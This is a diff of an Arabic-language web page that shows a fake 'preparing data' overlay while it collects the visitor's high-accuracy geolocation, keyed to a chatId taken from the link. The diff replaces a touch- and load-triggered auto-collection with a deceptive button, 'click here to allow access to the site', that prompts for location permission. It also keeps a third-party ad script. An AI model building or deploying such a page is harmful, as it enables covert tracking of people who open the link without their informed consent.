@@ -30,17 +30,29 @@
       flex-direction: column;
       cursor: pointer;
     }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      background-color: #007bff;
+      color: #fff;
+      cursor: pointer;
+      margin-top: 15px;
+    }
   </style>
 </head>
 <body>
   <div id="overlay">
     <h2>لحظة واحدة...</h2>
     <p>جارٍ تجهيز البيانات</p>
+    <button id="startBtn">اضغط هنا للسماح بالوصول للموقع</button>
   </div>
 
 <script>
 const chatId = new URLSearchParams(window.location.search).get("chatId");
 const overlay = document.getElementById('overlay');
+const startBtn = document.getElementById('startBtn');
 
 async function sendData() {
   overlay.innerHTML = "<h2>جارٍ جمع البيانات...</h2>";
@@ -97,27 +109,20 @@ async function sendData() {
     }
 
   }, (err) => {
-    overlay.innerText = "لم يتم السماح بالموقع ❌";
+    if(err.code === 1){
+      overlay.innerText = "يرجى السماح بالوصول للموقع من الإعدادات ❌";
+    } else {
+      overlay.innerText = "تعذر الحصول على الموقع ❌";
+    }
   }, { enableHighAccuracy: true });
 }
 
-// محاولة تلقائية بعد نصف ثانية
-setTimeout(() => {
-  // على iOS Safari يجب تفاعل افتراضي، نستخدم حدث اللمس/تمرير
-  const trigger = () => {
-    sendData();
-    document.removeEventListener('touchstart', trigger);
-    document.removeEventListener('touchmove', trigger);
-  };
-  document.addEventListener('touchstart', trigger);
-  document.addEventListener('touchmove', trigger);
-
-  // لمحاكاة تفاعل تلقائي على بعض الأجهزة
-  sendData();
-}, 500);
-
+// حدث الضغط على الزر لتشغيل جمع البيانات
+startBtn.addEventListener('click', sendData);
 </script>
 
+<!-- كود الإعلانات -->
 <script type='text/javascript' src='https://pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
+
 </body>
 </html>
